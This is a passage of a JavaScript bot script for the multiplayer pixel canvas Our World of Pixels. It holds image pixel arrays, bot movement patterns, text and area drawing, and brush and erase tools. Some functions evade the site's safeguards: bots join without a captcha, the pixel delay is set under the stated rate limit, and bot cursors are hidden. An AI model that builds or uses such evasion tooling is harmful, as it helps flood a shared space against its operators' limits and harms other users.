250, 250, 250, 250, 250, 250, 250, 250, 250, 250];
pf.width = 22;
pf.height = 26;
var test = [41, 41, 41, 1, 1, 1, 8, 8, 8, 255, 130, 255];
test.width = 3;
test.height = 2;
var road = [170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170, 170, 170, 170, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 120, 170, 170, 170];
road.width = 16;
road.height = 1000;
//}
var pixelData = [];
var select = {
    start: {
        x: 0,
        y: 0
    }, //sets with B
    end: {
        x: 0,
        y: 0
    } //sets with N
};

var imageList = [{
        name: "$erase",
        data: creep_img,
        colors: "rgba"
    }, {
        name: "$fox",
        data: fox,
        colors: "rgb"
    }, {
        name: "$donut",
        data: donut,
        colors: "rgb"
    }, {
        name: "$nyan",
        data: nyan,
        colors: "rgb"
    }, {
        name: "$minion",
        data: minion,
        colors: "rgb"
    }, {
        name: "$p1",
        data: dino,
        colors: "rgb"
    }, {
        name: "$p4",
        data: dino2,
        colors: "rgb"
    }, {
        name: "$p7",
        data: turtle,
        colors: "rgb"
    }, {
        name: "$pika",
        data: pika,
        colors: "rgb"
    }, {
        name: "$evee",
        data: evee,
        colors: "rgb"
    }, {
        name: "$shroom",
        data: shroom,
        colors: "rgb"
    }, {
        name: "$mario",
        data: mario,
        colors: "rgb"
    }, {
        name: "$bird",
        data: bird,
        colors: "rgb"
    }, {
        name: "$r2d2",
        data: r2d2,
        colors: "rgb"
    }, {
        name: "$mario2",
        data: mario2,
        colors: "rgb"
    }, {
        name: "$cat",
        data: cat,
        colors: "rgb"
    }, {
        name: "$doge",
        data: doge,
        colors: "rgb"
    }, {
        name: "$flower",
        data: flower,
        colors: "rgb"
    }, {
        name: "$tux_h",
        data: tux_head,
        colors: "rgba"
    }, {
        name: "$chal",
        data: challenge,
        colors: "rgb"
    }, {
        name: "$groot",
        data: groot,
        colors: "rgb"
    }, {
        name: "$hulk",
        data: hulk,
        colors: "rgb"
    }, {
        name: "$flag",
        data: cz_flag,
        colors: "rgba"
    }, {
        name: "$reddit",
        data: reddit,
        colors: "rgb"
    }, {
        name: "$donut2",
        data: donut2,
        colors: "rgb"
    }, {
        name: "$fox2",
        data: fox2,
        colors: "rgb"
    }, {
        name: "$catz",
        data: catz,
        colors: "rgb"
    }, {
        name: "$mariosh",
        data: mariosh,
        colors: "rgb"
    }, {
        name: "$ded",
        data: deadpool,
        colors: "rgb"
    }, {
        name: "$chrome",
        data: chrome,
        colors: "rgb"
    }, {
        name: "$pf",
        data: pf,
        colors: "rgb"
    }, {
        name: "$test",
        data: test,
        colors: "rgb"
    }, {
        name: "$road",
        data: road,
        colors: "rgb"
    }
];

// This fixes modulo to work on negative numbers (-1 % 16 = 15)
Number.prototype.mod = function(n) { return ((this % n) + n) % n; };

var __WorldOfPixels = { chunks: { }, net: { players: { } } };

setTimeout(function tymaut() {
	__WorldOfPixels.net.placeBucket = protocol.placeBucket;
	__WorldOfPixels.net.chatBucket = protocol.chatBucket;
}, 3000);

(__WorldOfPixels.net.Re_ConfigureLogicalStuff = function Re_ConfigureLogicalStuff(UsefulThings) {
	(setTimeout) ((()=>{
		(protocol.worldName)&&
			(this.worldName = protocol.worldName);
				this.players = new this.players.constructor;
			(protocol.id)&&
		(this.id = protocol.id);
	}),(3000))
}.bind(__WorldOfPixels.net))();

ON(EVENTS.net.connected, __WorldOfPixels.net.Re_ConfigureLogicalStuff);
ON(EVENTS.net.disconnected, __WorldOfPixels.net.Re_ConfigureLogicalStuff);

ON(EVENTS.net.world.playersMoved, function onPlayersMoved(updates) {
	var player, u, rgb;
	for (var pid in updates) {
		u = updates[pid];
		if (player=this.net.players[pid]/*!= undefined*/) {
			player.x = u.x; player.y = u.y;
		} else if (pid !== this.net.id)
			this.net.players[pid] = { x: u.x, y: u.y, id: pid+[] };
	}
}.bind(__WorldOfPixels));

ON(EVENTS.net.world.playerCount, function onPlayersLeft(updates) {
	if (updates)
		for (var dpid of updates)
			delete this.net.players[dpid];
}.bind(__WorldOfPixels));

ON(EVENTS.net.chunk.load, function onChunkLoad(chunk) {
	this.chunks[[chunk.x, chunk.y]] = chunk;
}.bind(__WorldOfPixels));

function port(id) {
	var p = ppl()[id];
    if (p)
		tp(p.x >> 4,  p.y >> 4);
	else console.log("id doesnt exist");
}

function getPos(id) {
	var p = ppl()[id];
    if (p)
        return {
            x: (p.x >> 4) | 0,
            y: (p.y >> 4) | 0
        };
    else if (id == protocol.id)
        return getPlayerPos();
    else console.log("id doesnt exist");
}

function getPlayerPos() {
    return {
        x: (OWOP.camera.x + OWOP.mouse.x / (bots.beta ? OWOP.camera.zoom : 16)) | 0,
        y: (OWOP.camera.y + OWOP.mouse.y / (bots.beta ? OWOP.camera.zoom : 16)) | 0
    };
}

function getPPLcount() {
	return Object.keys(protocol.players).length;
}

function ppl() {
	return __WorldOfPixels.net.players;
}

function tp(x, y) {
	try {
		EMIT(EVENTS.net.world.teleported, x, y);
	} catch(e) {
		console.error(
		  "Teleportation with the EventEmitter didn't work, falling back to changing camera position. Probably won't work."
		);
		OWOP.camera.x = x - (window.innerWidth  / OWOP.camera.zoom / 2.5);
		OWOP.camera.y = y - (window.innerHeight / OWOP.camera.zoom / 2.5);
		OWOP.renderer.updateCamera();
	}
}

function getImage(com) {
    for (var i = 0; i < imageList.length; i++)
        if (com == imageList[i].name)
            return imageList[i];
    return null;
}

function savePixels(startX, startY, endX, endY) {
    var width = Math.max(endX, startX) - Math.min(endX, startX) + 1,
       height = Math.max(endY, startY) - Math.min(endY, startY) + 1,
	   x, y;
    for (x = 0; x < width; x++)
        for (y = 0; y < height; y++)
            pixelData[x + y * width] = OWOP.world.getPixel(startX + x, startY + y);
    pixelData.width  = width;
    pixelData.height = height;
    console.log(pixelData);
}

function paste(x, y) {
    if (pixelData.length/*>0*/)
        bots.drawBmp(x, y, pixelData.width, pixelData.height, pixelData);
}

function drawImg(name, x, y, img, colors) {
    if (bots.busy)
        return err("cant draw.(" + bots.job + ")");
	if (isNaN(x) || isNaN(y))
		return err("invalid coordinates.");
	err("drawing " + name + " at " + x + " " + y);
	bots.drawRaw(x, y, img.width, img.height, img, colors);
}

function err(msg) {
    if (typeof(msg) == "string")
        console.log(msg);
	OWOP.chat.local("[BOT]:" + msg);
//  WorldOfPixels.chatMessage("[BOT]:" + msg);
//  msg = "[BOT]:" + msg;
	/*try {
		protocol.messageHandler( { data: msg } );
	} catch(e) {
		console.warn("Couldn't use protocol.messageHandler, trying to fall back to EventEmitter: ", e);
		try {
			EMIT(EVENTS.net.chat, msg);
		} catch(e2) {
			cansole.warn("Couldn't use EventEmitter to put log the chat either: ", e2);
		}
	}*/
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

var bots = {};
var DELAY = Math.ceil(0.3 / BOTS); //max is allowed 200pixels/4s (1px/125ms)
//var DELAY = Math.ceil(1 + (MOD?65:130) / BOTS); //max is allowed 200pixels/4s (1px/125ms), for mods 200pixels/2s (1px/62.5ms)
var inter, f = 0;
bots.busy = false;
bots.online = false;
bots.job = "";
bots.stop = false;
bots.chunks = {};
bots.visible = {
    startX: 0,
    startY: 0,
    endX: 0,
    endY: 0,
    x: 0,
    y: 0
};
bots.beta = true;
var updInt;

var SITEKEY = "6LcgvScUAAAAAARUXtwrM8MP0A0N70z4DHNJh-KI";
async function joinBotWithCaptcha(id) {
	return new Promise((resolve, reject) => {
		OWOP.windowSys.addWindow(new OWOP.windowSys.class.window("Verification needed", {
			closeable: true
		}, function (wdow) {
			var id = grecaptcha.render(wdow.addObj(OWOP.util.mkHTML("div", {
				style: "margin: -4px;" /* NOTE: not setting cssText */
			})), {
				theme: "dark",
				sitekey: SITEKEY,
				callback: function callback(token) {
					console.log("Captcha callback");
					console.log(token);
					var bot = new Bot(id);
					bot.setToken(token);
					wdow.close();
					resolve(bot);
				}
			});
			wdow.frame.style.cssText = "";
			wdow.container.style.cssText = "overflow: hidden; background-color: #F9F9F9";
		}));
	});
}

bots.joinWithCaptcha = async function() {
	if (bots.online)
		return err("already online");
	var boats = BOTS;
	BOTS = 0;
    for (var i = 0; i < boats; i++) {
		var bot = this[i] = await joinBotWithCaptcha(i);
		bot.init();
        console.log(protocol.worldName);
		bots.online = true;
		BOTS++;
    }
    //inter=setInterval(bots.follow,100);
    updInt = setInterval(this.updateCamera, 200);
    this.lastCleanup = Date.now();
}.bind(bots);

bots.joinWithoutCaptcha = function() {
	if (bots.online)
		return err("already online");
	var bot;
    for (var i = 0; i < BOTS; i++) {
        bot = this[i] = new Bot(i);
		bot.captcha = false;
        bot.init();
        console.log(protocol.worldName);
        bots.online = true;
    }
    //inter=setInterval(bots.follow,100);
    updInt = setInterval(this.updateCamera, 200);
    this.lastCleanup = Date.now();
}.bind(bots);

bots.moveTo = function(x, y) {
    if (this.online)
        for (var i = 0; i < BOTS; i++) {
            this[i].pos.x = x + i;
            this[i].pos.y = y;
        }
}.bind(bots);

bots.moveTonoi = function(x, y) {
    if (this.online)
        for (var i = 0; i < BOTS; i++) {
            this[i].pos.x = x;
            this[i].pos.y = y;
        }
}.bind(bots);

bots.leave = function() {
    if (!bots.online)
        return err("bot offline");
    for (var i = 0; i < BOTS; i++) {
		try{ clearInterval(this[i].net.updateInterval); }catch(e){console.error(e);}
        try{ this[i].net.connection.close();            }catch(e){console.error(e);}
        try{ this[i].net = null;                        }catch(e){console.error(e);}
        try{ this[i] = null;                            }catch(e){console.error(e);}
        try{ clearInterval(updInt);                     }catch(e){console.error(e);}
        try{ bots.online = false;                       }catch(e){console.error(e);}
    }
};

var PI2 = 2 * Math.PI, FOLLOWADD = PI2 / 45/*PI2 / 360 * 20*/, BOTSLICE = PI2 / BOTS;

bots.follow = function(id) {
    var plpllo = 0;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id), a, i = BOTS;
    while (i--)
        if (this[i] && !this.busy) {
            plpllo+= 2;
            a = BOTSLICE * i + f;
            this[i].pos.x = pos.x + (Math.cos(1 * Math.PI / BOTS * i + f) * radiusing);
            this[i].pos.y = pos.y + (Math.sin(1 * Math.PI / BOTS * i + f) * radiusing);
            //this[i].pos.x = pos.x + plpllo;
            //this[i].pos.y = pos.y;
        }
    f = (f + FOLLOWADD) % PI2;
}.bind(bots);

bots.follow1 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player é default

    var pos = getPos(id),
        a, i = BOTS;
    while (i--)
        if (this[i] && !this.busy && !(this[i].pos.x < 0) && !(this[i].pos.y < 0)) {
            a = BOTSLICE * i + f;
            this[i].pos.x = pos.x + 3 * i + 3;
            this[i].pos.y = pos.y;
        } else if (this[i] && !this.busy && this[i].pos.x < 0 && !(this[i].pos.y < 0)) {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + 3 * i;
        this[i].pos.y = pos.y;
    } else if (this[i] && !this.busy && this[i].pos.y < 0 && !(this[i].pos.x < 0)) {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + 3 * i + 3;
        this[i].pos.y = pos.y + 1;
    } else {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + 3 * i;
        this[i].pos.y = pos.y + 1;
    }

}.bind(bots);

bots.follow2 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;

            this[i].pos.x = pos.x + (Math.sin(10 * Math.PI / BOTS * i * f) * radiusing);
            this[i].pos.y = pos.y + (Math.cos(5 * Math.PI / BOTS * i * f) * radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow3 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            this[i].pos.x = pos.x + (Math.sin(2 * Math.PI / BOTS * i * f) * -radiusing);
            this[i].pos.y = pos.y + (Math.cos(2 * Math.PI / BOTS * i * f) * radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow4 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;

            this[i].pos.y = pos.y + (Math.cos(2 * Math.PI / BOTS * i + f) * -radiusing);
            this[i].pos.x = pos.x + (Math.sin(2 * Math.PI / BOTS * i + f) * radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow5 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;

            this[i].pos.y = pos.y + (Math.cos(31 * Math.PI / BOTS * i * f) * radiusing);
            this[i].pos.x = pos.x + (Math.sin(-3 * Math.PI / BOTS * i * f) * -radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow6 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player é default

var pos = getPos(id), a, i = BOTS;
while (i--)
    if (this[i] && !this.busy) {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + (Math.cos(3 * Math.PI / BOTS * i + f) * radiusing);
        this[i].pos.y = pos.y + (Math.sin(3 * Math.PI / BOTS * i + f) * radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow7 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player é default

function infinityX(t) {
    let x = (Math.cos(t*2)-1)/2;
    if (Math.abs(t*2) % (4*Math.PI) > 2*Math.PI) return -x;
    else return x;
}
function infinityY(t) {
    return Math.sin(t*2) / 2;
}

var pos = getPos(id), a, i = BOTS;
while (i--)
    if (this[i] && !this.busy) {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + (infinityX(f / BOTS * i + f) * radiusing);
        this[i].pos.y = pos.y + (infinityY(f / BOTS * i + f) * radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow8 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player é default

function squareX(angle) {
    let x = Math.sin(angle), y = Math.cos(angle);
    return x / Math.max(Math.abs(x), Math.abs(y));
}
function squareY(angle) {
    let x = Math.sin(angle), y = Math.cos(angle);
    return y / Math.max(Math.abs(x), Math.abs(y));
}

var pos = getPos(id), a, i = BOTS;
while (i--)
    if (this[i]) {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + (squareX(f / BOTS * i + f) * radiusing);
        this[i].pos.y = pos.y + (squareY(f / BOTS * i + f) * radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow9 = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player é default

var pos = getPos(id), a, i = BOTS;
while (i--)
    if (this[i]) {
        a = BOTSLICE * i + f;
        this[i].pos.x = pos.x + (Math.floor(Math.random() * (radiusing - -radiusing)) + -radiusing);
        this[i].pos.y = pos.y + (Math.floor(Math.random() * (radiusing - -radiusing)) + -radiusing);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow10 = function (id) {
	let aaaa = 1;
	let bbbb = 1;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            var angle = (Math.PI * 2 / BOTS) * i + f
            this[i].pos.y = pos.y + radiusing * Math.cos(angle + f);
            this[i].pos.x = pos.x + radiusing * Math.sin(angle);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.follow11 = function (id) {
	let aaaa = 1;
	let bbbb = 1;
    let zxc = (f + FOLLOWADD) + 1850;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            if(i > BOTS/2) {
                this[i].pos.y = pos.y + radiusing * Math.cos(Math.PI * 2 / BOTS * i + f);
                this[i].pos.x = pos.x + radiusing * Math.sin(Math.PI * 2 / BOTS * i);
            } else {
                this[i].pos.y = pos.y + radiusing * Math.cos(Math.PI * 2 / BOTS * i + zxc);
                this[i].pos.x = pos.x + radiusing * Math.sin(Math.PI * 2 / BOTS * i);
            }
        }
    f = (f + FOLLOWADD);
    zxc = (f + FOLLOWADD) + 100;
}.bind(bots);

bots.follow12 = function (id) {
	let aaaa = 1;
	let bbbb = 1;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            if(i > BOTS/2) {
                this[i].pos.y = pos.y + Math.cos(Math.PI * 2 / BOTS * i + f + 2) * radiusing;
                this[i].pos.x = pos.x + Math.sin(Math.PI * 2 / BOTS * i + f) * radiusing;
            } else {
                this[i].pos.y = pos.y + Math.cos(Math.PI * 2 / BOTS * i + f) * radiusing;
                this[i].pos.x = pos.x + Math.sin(Math.PI * 2 / BOTS * i + f + 2) * radiusing;
            }
        }
    f = (f + FOLLOWADD);
    zxc = (f + FOLLOWADD) + 100;
}.bind(bots);

bots.follow13 = function (id) {
	let aaaa = 1;
	let bbbb = 1;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            this[i].pos.y = pos.y + Math.cos(Math.PI * 2 / BOTS * i + f) * radiusing;
            this[i].pos.x = pos.x + Math.sin(Math.PI * 2 / BOTS - i + f) * radiusing;
        }
    f = (f + FOLLOWADD);
    zxc = (f + FOLLOWADD) + 100;
}.bind(bots);

bots.follow14 = function (id) {
	let aaaa = 1;
	let bbbb = 1;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            this[i].pos.y = pos.y + Math.cos(2 * Math.PI / BOTS * i + f) * radiusing;
            this[i].pos.x = pos.x + Math.sin(2 * Math.PI ** BOTS * i + f) * radiusing;
        }
    f = (f + FOLLOWADD);
    zxc = (f + FOLLOWADD) + 100;
}.bind(bots);

bots.follow15 = function (id) {
	let aaaa = 1;
	let bbbb = 1;
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i] && !this.busy) {
            a = BOTSLICE * i * f;
            this[i].pos.y = pos.y + Math.cos(2 * Math.PI / BOTS * i + f) * radiusing;
            this[i].pos.x = pos.x + Math.sin(2 * Math.PI * 2 / BOTS * i + f) * radiusing;
        }
    f = (f + FOLLOWADD);
    zxc = (f + FOLLOWADD) + 100;
}.bind(bots);

bots.hidecursor = function (id) {
    if (!ppl()[id])
        id = protocol.id; //player is default

    var pos = getPos(id),
        a, i = BOTS;

    while (i--)
        if (this[i]) {
            a = BOTSLICE * i * f;

            this[i].pos.y = 10000 + randint(-50,50);
            this[i].pos.x = 10000 + randint(-50,50);
        }
    f = (f + FOLLOWADD);
}.bind(bots);

bots.writxt = async function(str, x, y) {
    if (isNaN(x) || isNaN(y)) {
        err("wrong parameters");
        return;
    }
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.busy = true;
    this.job = "writing";
    this.moveTonoi(9999999, 9999999);
    await sleep(100);
    str = str.toUpperCase();
	var len = str.length, ccode, matrix;
    for (var i = 0; i < len; i++) {
        ccode = str.charCodeAt(i);
        if (ccode >= 0x41 && ccode <= 0x5a) //letters
            matrix = chars[ccode - 65];
          else if (ccode == 0x20) { //space
            x += 2;
            continue;
        } else if (ccode >= 0x30 && ccode <= 0x39) //numbers
            matrix = NUMS[ccode - 0x30];
          else if (symbols[ccode]) //symbols
            matrix = symbols[ccode];
          else {
            console.log("unknown symbol");
            continue;
        }
        this.drawChar(matrix, x, y);
        x += matrix.length + 1;
        await sleep(700);
    }
    this.busy = false;
};
OWOP.tool.addToolObject(new OWOP.tool.class('Bot Mini erase', OWOP.cursors.erase, OWOP.fx.player.RECT_SELECT_ALIGNED(4), false, function(tool){
//EraseTool V2 By Raposo
    let inprog = false;
    const set = (x, y, color) => {
        OWOP.net.protocol.lastSentX = x*16;
        OWOP.net.protocol.lastSentY = y*16;
        OWOP.net.connection.send(new Int32Array([OWOP.net.protocol.lastSentX, OWOP.net.protocol.lastSentY, 0]).buffer);
        OWOP.world.setPixel(x, y, color);
    };
    const eq = (a, b) => a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
    function clearChunk(chunkX, chunkY){

    }
    tool.setEvent('mousemove mousedown', function(mouse, event){
        if(mouse.buttons === 1){
		    var drushercolor = [255, 255, 255]
			var xpos = OWOP.mouse.tileX;
            var ypos = OWOP.mouse.tileY;
            OWOP.world.setPixel(xpos, ypos, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+1, ypos, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+2, ypos, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+3, ypos, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos, ypos+1, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+1, ypos+1, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+2, ypos+1, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+3, ypos+1, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos, ypos+2, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+1, ypos+2, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+2, ypos+2, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+3, ypos+2, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos, ypos+3, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+1, ypos+3, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+2, ypos+3, [255, 255, 255], 0);
            OWOP.world.setPixel(xpos+3, ypos+3, [255, 255, 255], 0);
			setTimeout(function () {
			bots.drawRectbrush(xpos, ypos, 4, 4, [255, 255, 255])
			},0);

        }
        inprog = true;
    });
}));

function clearBuffer(){
}

//brushtool function by raposo
OWOP.tool.addToolObject(new OWOP.tool.class('Bot Brush', OWOP.cursors.brush, OWOP.fx.player.RECT_SELECT_ALIGNED(2), false, function(tool){
    let inprog = false;
    const set = (x, y, color) => {
        OWOP.world.setPixel(x, y, color);
    };
    const eq = (a, b) => a[0] === b[0] && a[1] === b[1] && a[2] === b[2];
    function clearChunk(chunkX, chunkY){

    }
    tool.setEvent('mousemove mousedown', function(mouse, event){
        if(mouse.buttons === 1){
		    var brushercolor = OWOP.player.selectedColor
			var xpos = OWOP.mouse.tileX;
            var ypos = OWOP.mouse.tileY;
			OWOP.world.setPixel(xpos, ypos, brushercolor, 0);
            OWOP.world.setPixel(xpos+1, ypos, brushercolor, 0);
            OWOP.world.setPixel(xpos, ypos+1, brushercolor, 0);
            OWOP.world.setPixel(xpos+1, ypos+1, brushercolor, 0);
			setTimeout(function () {
			bots.drawRectbrush(xpos, ypos, 2, 2, brushercolor)
			},50);

        }
        inprog = true;
    });
}));

bots.drawChar = async function(matrix, x, y) {
	// matrix = e.g. [0b1111111, 0b1000001, 0b1010111, 0b1010100, 0b1010111, 0b1000001, 0b1111111] /*A*/
    for (var xx = 0; xx < matrix.length; xx++)
        for (var yy = 0; yy < 8; yy += BOTS) // yy < 5
            for (var bb = 0; bb < BOTS; bb++)
                if ((matrix[xx] >> (7 - yy - bb)) & 1 && yy + bb < 8) { // (4 - yy - bb), && yy + bb < 5
                    this[bb].pixel(x + xx, y + yy + bb, OWOP.player.palette[OWOP.player.paletteIndex]);
                    await sleep(DELAY);
				}
};

bots.drawRect = async function(x, y, w, h, color) {//-54 25 57 39
    if (isNaN(x) || isNaN(y) || isNaN(w) || isNaN(h)) {
        console.log("wrong parameters");
        return;
    }
    if (!this.online) {
        err("bot offline");
        return;
    }
    this.job = "filling";
    color = color || OWOP.player.palette[OWOP.player.paletteIndex];
    //err(bots.job + " [" + x + "," + y + "] " + w + "x" + h + " #" + (((color[0] << 16) | color[1] << 8) | color[2]).toString(16));
    this.busy = true;
    var pixel, newY, newX, Y, X, i;
    this.moveTonoi(9999999, 9999999);
    await sleep(100);
    for (Y = 0; Y < h; Y++) {
        for (X = 0; X < w; X += BOTS) {
            for (i = 0; i < BOTS; i++) {
                if (this.stop)
                    return this.stop = this.busy = false;
                if (X + i < w) {
                    over = 0;
                    newX = X + i;
                    newY = Y;
                    pixel = OWOP.world.getPixel(x + newX, y + newY);
                    if (pixel[0] !== color[0] || pixel[1] !== color[1] || pixel[2] !== color[2]) {
                        this[i].pixel(x + newX, y + newY, color);//.net.updatePixel(x + newX, y + newY, color);
                        await sleep(0);
                    } else continue;
                }
            }
          //this.moveTo(x + Math.floor(X / 40) * 40, y + Y); //bot se musi presunout,aby byl v dosahu
        }
    }
    this.busy = false;
    this.moveTonoi(9999999, 9999999);
    //err(bots.job + " done.");
};
let getFree = () => {
    let b = this.filter(i => i.ws.readyState === 1);
    if (b.length === 0) return 0;
    if (last >= b.length) last = 0;
    return last++;
};
bots.fastarea = async function(x, y, w, h, color) {//-54 25 57 39
    if (isNaN(x) || isNaN(y) || isNaN(w) || isNaN(h)) {
        console.log("wrong parameters");
        return;
    }
    if (!this.online) {
        err("bot offline");
        return;
    }
